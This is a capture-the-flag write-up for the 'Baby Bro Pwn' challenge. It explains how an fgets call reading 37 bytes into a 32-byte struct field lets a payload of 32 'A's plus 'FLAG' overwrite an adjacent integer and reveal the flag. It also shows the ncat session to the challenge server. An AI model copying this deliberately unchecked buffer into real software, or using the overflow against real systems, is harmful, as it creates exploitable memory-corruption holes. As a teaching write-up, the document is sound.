# Writeup

by .spydx @ bwnfools

## Baby Bro Pwn :baby:

Downloading the challenge, we got a `.zip` containing a binary and source file in `C`.

```shell
❯ unzip src.zip                    
Archive:  src.zip
  inflating: baby_bro_pwn_src        
  inflating: baby_bro_pwn.c    
```

Uppon examining the source code, I noted that there was a variable called FLAG that held a placehodler flag.

```c
char *FLAG = "EPT{n0t_th1s_fl4g_bruh}";
```

Continuing to `main`, we could obeserve the following.

- A `Dude` struct was allocated
- Two function calls
- A `do {} while (1)` loop
- An `if` check for a special value `0x47414c46`

Inside this loop, the first things that happend is that it requests the users input, and then after that checks the `homie.showFlag` struct for a value, and then it prints the FLAG variable.

```c
do
{
    printf("What's up dude?\n> ");
    fgets(homie.message, 37, stdin);

    if (homie.showFlag == 0x47414c46)
    {
        ...
        printf("%s\n", FLAG);
        ...
```

Studing `fgets`, one can see that this accepts 37 chars and places it int the `homie.message`, `fgets(homie.message, 37, stdin);`.

Looking at the Dude struct we could see that the `char message[32];` only accepts 32 chars vs the allowed 37 from stdin.

```c
struct __attribute__((__packed__)) Dude
{
	char message[32]; // allocates 32 
	int showFlag;
};
```

Since `showFlag` is a condition of the `if` statement in our `main`, we should see that happens if we overflow `homie.message`.

If we just pass a lot of random chars to the userinput, nothing really happens.
The program continues in its loop.

But since the if check in our `do` loop checks on a very specific value.

```c
if (homie.showFlag == 0x47414c46)
```

Using CyberChef, the value `0x47414c46` from Hex translates to `GALF`.
Since the architecture of `x86-64` is Little endian[1], we must then reverse it and we have `FLAG`.
If we then create a message that is 37 chars long, with the last 4 chars being `FLAG`
Giving us the following payload: `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLAG`.

Let us try it:

```shell
└─$ ncat --ssl baby-bro-pwn.ept.gg 1337
What's up dude?
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLAG

Yoooo lit af fam!
sick tbh...
legit dude, my broski passed me this msg, you can lowkey get it.
no cap.

EPT{g00d_j0b_my_dud3}
```

## Explaination

This is a classic buffer overflow [2] exploit where we are able to modify the memory of other fields due to its structure in the memory.
Since we are allowed to pass 37 chars as user input, and the receiving variable is only accepting 32, `fgets` allows us to continue writing further into the memory and hence overwrites the value of `showFlag`.

Layout of the struct `Dude`

```c
struct __attribute__((__packed__)) Dude
{
	char message[32]; // allocates 32 
	int showFlag;
};
```

Since the program does not check the length of the user input, we are able to write the values we would want into the allocated memory of `showFlag`.
This then modifies the behaviour of the program allowing us to pass the `if` check that is comparing the values in `showFlag`. Since we submitted the `FLAG` into the `showFlag` the flag then gets printed to stdout.

## Sources

1. [https://en.wikipedia.org/wiki/Endianness#Hardware](https://en.wikipedia.org/wiki/Endianness#Hardware)
2. [https://en.wikipedia.org/wiki/Buffer_overflow](https://en.wikipedia.org/wiki/Buffer_overflow)